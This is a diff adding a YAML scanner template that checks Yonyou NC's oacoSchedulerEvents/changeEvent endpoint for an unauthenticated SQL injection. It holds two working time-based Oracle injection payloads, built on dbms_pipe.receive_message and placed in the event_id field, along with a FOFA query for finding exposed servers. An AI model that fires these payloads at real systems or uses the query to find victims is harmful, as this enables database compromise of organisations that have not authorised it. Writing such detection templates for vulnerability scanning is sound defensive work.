@@ -1,0 +1,39 @@
+id: yongyou-nc-changeevent-sqli
+
+info:
+  name: 用友NC changeEvent SQL注入漏洞
+  author: avic123
+  severity: high
+  verified: true
+  description: |-
+    用友NC oacoSchedulerEvents/changeEvent 接⼝处存在SQL注入漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。
+    fofa：icon_hash="1085941792" || app="用友-UFIDA-NC"
+  reference:
+    - https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html
+  tags: yongyou,nc,sqli
+  created: 2025/08/27
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        event_id=1'AND 1=dbms_pipe.receive_message('RDS',5)--+#+&startDate=2025-05-07 12:12:12&startDate_old=2025-05-06 12:12:12
+    expression: |
+      response.status == 500 && response.latency <= 7000 &&  response.latency >= 5000
+
+  r1:
+    request:
+      method: POST
+      path: /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        event_id=1'AND 1=dbms_pipe.receive_message('RDS',10)--+#+&startDate=2025-05-07 12:12:12&startDate_old=2025-05-06 12:12:12
+    expression: |
+      response.status == 500 && response.latency <= 12000 &&  response.latency >= 10000
+
+expression: r0() && r1()
